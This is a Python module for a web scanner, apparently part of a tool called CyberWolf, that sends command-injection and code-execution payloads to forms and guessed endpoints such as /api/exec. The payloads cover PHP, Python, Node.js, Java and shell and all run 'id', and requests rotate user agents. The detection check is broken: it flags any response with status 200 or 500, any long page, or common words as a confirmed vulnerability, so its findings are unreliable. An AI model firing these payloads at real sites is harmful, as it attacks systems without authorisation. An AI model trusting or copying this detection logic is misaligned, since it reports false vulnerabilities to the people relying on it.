"""
Remote Code Execution (RCE) vulnerability scanner module
"""

import logging
import requests
import random
from bs4 import BeautifulSoup
from colorama import Fore, Style
from urllib.parse import urljoin, urlparse

logger = logging.getLogger('CyberWolf.RCEScanner')

class RCEScanner:
    """
    Scanner module for detecting Remote Code Execution (RCE) vulnerabilities
    """
    
    def __init__(self, timeout=10, verbose=False):
        """
        Initialize the RCE scanner
        
        Args:
            timeout (int): Request timeout in seconds
            verbose (bool): Enable verbose output
        """
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
        ]
        
        # RCE payloads to test
        self.rce_payloads = {
            # PHP payloads
            'php': [
                'system("id");',
                'exec("id");',
                'shell_exec("id");',
                'passthru("id");',
                '`id`;',
                'eval("system(\'id\')");',
                'assert("system(\'id\')");',
                'preg_replace("/.*/e", "system(\'id\')", "");',
                'create_function("", "system(\'id\')");',
                'call_user_func("system", "id");'
            ],
            
            # Python payloads
            'python': [
                'import os;os.system("id")',
                'import subprocess;subprocess.call("id", shell=True)',
                'import os;os.popen("id").read()',
                'import subprocess;subprocess.Popen("id", shell=True)',
                'eval("import os;os.system(\'id\')")',
                'exec("import os;os.system(\'id\')")',
                '__import__("os").system("id")'
            ],
            
            # Node.js payloads
            'node': [
                'require("child_process").exec("id")',
                'require("child_process").spawn("id")',
                'require("child_process").execSync("id")',
                'eval("require(\'child_process\').exec(\'id\')")',
                'Function("return require(\'child_process\').exec(\'id\')")()'
            ],
            
            # Java payloads
            'java': [
                'Runtime.getRuntime().exec("id")',
                'new ProcessBuilder("id").start()',
                'Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(null, "id")'
            ],
            
            # Shell payloads
            'shell': [
                'id',
                '$(id)',
                '`id`',
                ';id;',
                '|id|',
                '&&id&&',
                '||id||',
                'id;',
                'id|',
                'id&'
            ]
        }
    
    def scan(self, url, api_key=None):
        """
        Scan the given URL for RCE vulnerabilities
        
        Args:
            url (str): Target URL to scan
            api_key (str, optional): API key for enhanced scanning
        
        Returns:
            list: Found RCE vulnerabilities
        """
        logger.info(f"Starting RCE scan on {url}")
        vulnerabilities = []
        
        try:
            # Find potential RCE endpoints
            rce_endpoints = self._find_rce_endpoints(url)
            
            if not rce_endpoints:
                self._log_verbose("No potential RCE endpoints found")
                return vulnerabilities
            
            # Test each endpoint with RCE payloads
            for endpoint in rce_endpoints:
                self._log_verbose(f"Testing endpoint: {endpoint}")
                
                # Determine the technology stack if possible
                tech_stack = self._detect_tech_stack(endpoint)
                
                # Test with appropriate payloads based on tech stack
                for tech, payloads in self.rce_payloads.items():
                    if tech_stack and tech not in tech_stack:
                        continue
                        
                    for payload in payloads:
                        try:
                            # Test with different HTTP methods
                            for method in ['GET', 'POST', 'PUT']:
                                if method == 'GET':
                                    response = self.session.get(
                                        endpoint,
                                        params={'cmd': payload},
                                        headers={'User-Agent': random.choice(self.user_agents)},
                                        timeout=self.timeout,
                                        verify=True
                                    )
                                elif method == 'POST':
                                    response = self.session.post(
                                        endpoint,
                                        data={'cmd': payload},
                                        headers={'User-Agent': random.choice(self.user_agents)},
                                        timeout=self.timeout,
                                        verify=True
                                    )
                                else:  # PUT
                                    response = self.session.put(
                                        endpoint,
                                        data={'cmd': payload},
                                        headers={'User-Agent': random.choice(self.user_agents)},
                                        timeout=self.timeout,
                                        verify=True
                                    )
                                
                                # Check for RCE indicators in response
                                if self._is_vulnerable_to_rce(response, payload):
                                    vuln = {
                                        'type': 'RCE',
                                        'endpoint': endpoint,
                                        'method': method,
                                        'technology': tech,
                                        'payload': payload,
                                        'status_code': response.status_code,
                                        'response_length': len(response.text),
                                        'evidence': response.text[:200]  # First 200 chars of response
                                    }
                                    vulnerabilities.append(vuln)
                                    self._log_verbose(f"Found RCE vulnerability at {endpoint} using {method}")
                                    
                        except requests.RequestException as e:
                            logger.error(f"Error testing RCE payload: {str(e)}")
                            continue
            
            # Use API for enhanced scanning if available
            if api_key:
                self._log_verbose("Using API for enhanced RCE scanning")
                api_vulns = self._api_enhanced_scan(url, api_key)
                vulnerabilities.extend(api_vulns)
            
            logger.info(f"RCE scan completed. Found {len(vulnerabilities)} vulnerabilities")
            return vulnerabilities
            
        except Exception as e:
            logger.error(f"Error during RCE scan: {str(e)}")
            print(f"{Fore.RED}[!] Error during RCE scan: {str(e)}{Style.RESET_ALL}")
            return []
    
    def _find_rce_endpoints(self, url):
        """
        Find potential RCE endpoints on the target
        
        Args:
            url (str): Target URL
        
        Returns:
            list: Potential RCE endpoints
        """
        endpoints = []
        
        try:
            # Get the main page
            response = self.session.get(
                url,
                headers={'User-Agent': random.choice(self.user_agents)},
                timeout=self.timeout,
                verify=True
            )
            
            # Parse the page for potential RCE endpoints
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for common RCE endpoint patterns
            for form in soup.find_all('form'):
                action = form.get('action', '')
                if action:
                    full_url = urljoin(url, action)
                    endpoints.append(full_url)
            
            # Look for URL parameters that might be vulnerable
            for link in soup.find_all('a', href=True):
                href = link['href']
                if any(param in href.lower() for param in ['cmd=', 'exec=', 'run=', 'system=', 'eval=']):
                    full_url = urljoin(url, href)
                    endpoints.append(full_url)
            
            # Add common RCE endpoints
            common_endpoints = [
                '/api/exec',
                '/api/run',
                '/api/cmd',
                '/api/system',
                '/api/eval',
                '/api/command',
                '/api/shell',
                '/api/terminal',
                '/api/console',
                '/api/admin',
                '/api/debug',
                '/api/test'
            ]
            
            for endpoint in common_endpoints:
                full_url = urljoin(url, endpoint)
                endpoints.append(full_url)
            
            # Remove duplicates
            endpoints = list(set(endpoints))
            
            return endpoints
            
        except Exception as e:
            logger.error(f"Error finding RCE endpoints: {str(e)}")
            return []
    
    def _detect_tech_stack(self, url):
        """
        Detect the technology stack of the target
        
        Args:
            url (str): Target URL
        
        Returns:
            list: Detected technologies
        """
        tech_stack = []
        
        try:
            response = self.session.get(
                url,
                headers={'User-Agent': random.choice(self.user_agents)},
                timeout=self.timeout,
                verify=True
            )
            
            # Check headers for technology indicators
            headers = response.headers
            if 'X-Powered-By' in headers:
                powered_by = headers['X-Powered-By'].lower()
                if 'php' in powered_by:
                    tech_stack.append('php')
                if 'python' in powered_by:
                    tech_stack.append('python')
                if 'node' in powered_by:
                    tech_stack.append('node')
                if 'java' in powered_by:
                    tech_stack.append('java')
            
            # Check response content for technology indicators
            content = response.text.lower()
            if '<?php' in content:
                tech_stack.append('php')
            if 'import os' in content or 'import subprocess' in content:
                tech_stack.append('python')
            if 'require(' in content or 'process.' in content:
                tech_stack.append('node')
            if 'java.' in content or 'javax.' in content:
                tech_stack.append('java')
            
            # Check URL patterns
            if '.php' in url:
                tech_stack.append('php')
            if '.py' in url:
                tech_stack.append('python')
            if '.js' in url:
                tech_stack.append('node')
            if '.jsp' in url or '.java' in url:
                tech_stack.append('java')
            
            # Remove duplicates
            tech_stack = list(set(tech_stack))
            
            return tech_stack
            
        except Exception as e:
            logger.error(f"Error detecting tech stack: {str(e)}")
            return []
    
    def _is_vulnerable_to_rce(self, response, payload):
        """
        Check if the response indicates an RCE vulnerability
        
        Args:
            response (requests.Response): Response object
            payload (str): RCE payload used
        
        Returns:
            bool: True if vulnerable, False otherwise
        """
        # Check for common RCE indicators
        indicators = [
            # Command output indicators
            'uid=',
            'gid=',
            'groups=',
            'root:x:0:0:',
            'bin/bash',
            
            # Error messages
            'command not found',
            'permission denied',
            'no such file or directory',
            'syntax error',
            'parse error',
            
            # Shell indicators
            'sh:',
            'bash:',
            'cmd:',
            'powershell:',
            
            # Process indicators
            'process',
            'pid',
            'ppid',
            'tty',
            'time'
        ]
        
        # Check response content
        content = response.text.lower()
        
        # Check if any indicators are present
        for indicator in indicators:
            if indicator.lower() in content:
                return True
        
        # Check for unusual response length
        if len(response.text) > 1000:  # Arbitrary threshold
            return True
        
        # Check for specific status codes
        if response.status_code in [200, 500]:
            return True
        
        return False
    
    def _api_enhanced_scan(self, url, api_key):
        """
        Use API for enhanced RCE scanning
        
        Args:
            url (str): Target URL
            api_key (str): API key for authentication
        
        Returns:
            list: Additional vulnerabilities found via API
        """
        # This is a placeholder for actual API integration
        # In a real implementation, you would call a security API service
        self._log_verbose("API enhanced scanning is a placeholder in this version")
        return []
    
    def _log_verbose(self, message):
        """Log message if verbose mode is enabled"""
        if self.verbose:
            logger.debug(message)
            print(f"{Fore.CYAN}[RCE] {message}{Style.RESET_ALL}") 